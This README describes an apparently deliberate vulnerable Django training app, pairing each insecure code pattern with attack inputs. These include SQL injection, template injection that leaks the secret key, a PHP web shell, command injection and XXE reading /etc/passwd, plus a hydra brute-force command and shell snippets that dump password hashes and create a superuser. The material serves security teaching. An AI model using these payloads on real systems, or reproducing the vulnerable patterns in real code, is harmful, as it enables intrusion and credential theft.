# Django Vulnerable Application

## Overview
A deliberately vulnerable Django application demonstrating common security issues in Django web applications, including misconfigurations and framework-specific vulnerabilities.

## Quick Start

**Access URL**: http://localhost:8093

**Admin Panel**: http://localhost:8093/admin

**Default Credentials**:
- Admin: `admin` / `admin123`
- User: `testuser` / `password123`

## Application Features

- User authentication system
- Blog/Article management
- Comment system
- File upload functionality
- API endpoints
- Admin interface

## Vulnerabilities

### 1. SQL Injection via Raw Queries
```python
# Vulnerable view
def search_users(request):
    name = request.GET.get('name')
    users = User.objects.raw(f"SELECT * FROM users WHERE name = '{name}'")
    
# Attack
http://localhost:8093/search?name=' OR '1'='1
http://localhost:8093/search?name=' UNION SELECT password FROM auth_user--
```

### 2. Template Injection (SSTI)
```python
# Vulnerable template rendering
def render_template(request):
    template_string = request.GET.get('template')
    template = Template(template_string)
    return HttpResponse(template.render(Context()))
    
# Attack
http://localhost:8093/render?template={{7*7}}
http://localhost:8093/render?template={{settings.SECRET_KEY}}
```

### 3. Insecure Direct Object Reference (IDOR)
```python
# No authorization check
def view_profile(request, user_id):
    user = User.objects.get(id=user_id)
    return render(request, 'profile.html', {'user': user})
    
# Attack
http://localhost:8093/profile/1  # View admin profile
http://localhost:8093/profile/2  # View other users
```

### 4. Cross-Site Scripting (XSS)
```django
<!-- Unsafe template -->
<div>
    {{ user_input|safe }}  <!-- Bypasses escaping -->
</div>

<!-- Attack -->
<script>alert(document.cookie)</script>
```

### 5. Cross-Site Request Forgery (CSRF)
```python
# CSRF protection disabled
@csrf_exempt
def transfer_money(request):
    amount = request.POST.get('amount')
    to_user = request.POST.get('to_user')
    # Process transfer
```

### 6. Insecure File Upload
```python
def upload_file(request):
    file = request.FILES['file']
    # No validation
    with open(f'uploads/{file.name}', 'wb') as f:
        f.write(file.read())
        
# Attack - Upload shell
shell.php: <?php system($_GET['cmd']); ?>
```

### 7. Open Redirect
```python
def login(request):
    next_url = request.GET.get('next')
    # No validation
    return redirect(next_url)
    
# Attack
http://localhost:8093/login?next=http://evil.com
```

### 8. Debug Mode Enabled
```python
# settings.py
DEBUG = True  # Exposes sensitive information

# Attack - Trigger error
http://localhost:8093/nonexistent
# Shows full stack trace, settings, etc.
```

### 9. Weak Secret Key
```python
# settings.py
SECRET_KEY = 'django-insecure-123'  # Predictable

# Can forge sessions, CSRF tokens
```

### 10. Mass Assignment
```python
def update_profile(request):
    user = request.user
    # Updates all fields from request
    for key, value in request.POST.items():
        setattr(user, key, value)
    user.save()
    
# Attack - Escalate privileges
POST /update_profile
is_staff=true&is_superuser=true
```

### 11. Command Injection
```python
def ping_host(request):
    host = request.GET.get('host')
    # Unsafe
    output = os.system(f'ping -c 1 {host}')
    
# Attack
http://localhost:8093/ping?host=google.com;cat /etc/passwd
```

### 12. XXE in File Processing
```python
def parse_xml(request):
    xml_data = request.body
    # Unsafe XML parsing
    tree = etree.parse(BytesIO(xml_data))
    
# Attack
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

## Django-Specific Issues

### 1. Exposed Admin Interface
```bash
# Default admin URL accessible
http://localhost:8093/admin

# Brute force attack
hydra -l admin -P passwords.txt localhost -s 8093 http-post-form "/admin/login/:username=^USER^&password=^PASS^:F=invalid"
```

### 2. Information Disclosure via Debug
```python
# Debug toolbar exposed
http://localhost:8093/__debug__/

# API endpoints exposed
http://localhost:8093/api/__debug__/
```

### 3. Insecure Middleware
```python
# Custom middleware without security
class VulnerableMiddleware:
    def process_request(self, request):
        # Logs sensitive data
        logger.info(f"User {request.user} accessed {request.path} with data {request.POST}")
```

### 4. ORM Injection
```python
# Extra() method vulnerable
User.objects.extra(where=[f"username = '{username}'"])

# Annotate with raw SQL
User.objects.annotate(
    total=RawSQL(f"SELECT COUNT(*) FROM orders WHERE user_id = {user_id}", [])
)
```

## Exploitation Tools

### Django Shell Access
```bash
# If you gain code execution
python manage.py shell

# Dump all users
from django.contrib.auth.models import User
for user in User.objects.all():
    print(f"{user.username}: {user.password}")

# Create admin user
User.objects.create_superuser('hacker', 'hacker@evil.com', 'password')
```

### Session Hijacking
```python
# Decode session
import base64
session_data = "eyJ1c2VyX2lkIjoxfQ:1234567:abcdef"
decoded = base64.b64decode(session_data.split(':')[0])
```

### Settings Extraction
```python
# From template injection
{{ settings }}
{{ settings.DATABASES }}
{{ settings.SECRET_KEY }}
```

## Common Misconfigurations

1. **DEBUG = True** in production
2. **ALLOWED_HOSTS = ['*']** - Allows any host
3. **No HTTPS enforcement** - SECURE_SSL_REDIRECT = False
4. **Weak SECRET_KEY** - Default or predictable
5. **Database credentials in settings.py** - Not using environment variables
6. **CORS_ORIGIN_ALLOW_ALL = True** - Allows any origin
7. **No rate limiting** - Allows brute force

## Defense Mechanisms (What's Missing)
- ❌ Input validation and sanitization
- ❌ Parameterized queries
- ❌ CSRF protection enabled
- ❌ Secure session configuration
- ❌ Content Security Policy
- ❌ Rate limiting
- ❌ Secure file upload validation
- ❌ Proper authentication decorators

## Testing Commands

```bash
# Check for SQL injection
sqlmap -u "http://localhost:8093/search?name=test" --batch

# Template injection test
curl "http://localhost:8093/render?template={{7*7}}"

# Check security headers
curl -I http://localhost:8093

# Scan with nikto
nikto -h http://localhost:8093
```

## Learning Objectives
- Understanding Django security features
- Common Django misconfigurations
- Framework-specific vulnerabilities
- Secure Django development practices
- Django security middleware

## Additional Resources
- [Django Security Documentation](https://docs.djangoproject.com/en/stable/topics/security/)
- [OWASP Django Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Django_Security_Cheat_Sheet.html)
- [Django Security Best Practices](https://djangobook.com/django-security-best-practices/) 